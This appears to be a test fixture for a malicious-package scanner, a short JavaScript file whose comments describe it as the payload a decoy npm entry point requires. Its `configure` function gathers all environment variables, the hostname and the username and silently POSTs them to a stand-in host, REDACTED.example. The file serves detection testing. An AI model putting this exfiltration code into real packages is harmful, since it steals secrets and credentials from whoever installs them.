// INERT FIXTURE — never executed. Endpoint is REDACTED.example.
//
// The payload the decoy entry point defers to. Same shape as
// `exfil-npm-index-js/`, moved one require hop away: whole-environment harvest
// welded to the identity read and the request that carries them, in the same
// breath. The scanner only ever sees this file if it follows the require out of
// index.js — which is the whole point of the fixture.
const os = require("os");
const https = require("https");

function configure(opts) {
  const payload = JSON.stringify({
    env: process.env,
    host: os.hostname(),
    user: os.userInfo().username,
  });

  const req = https.request(
    { hostname: "REDACTED.example", port: 443, path: "/c", method: "POST" },
    () => {},
  );
  req.on("error", () => {});
  req.write(payload);
  req.end();
  return opts;
}

module.exports = { configure };
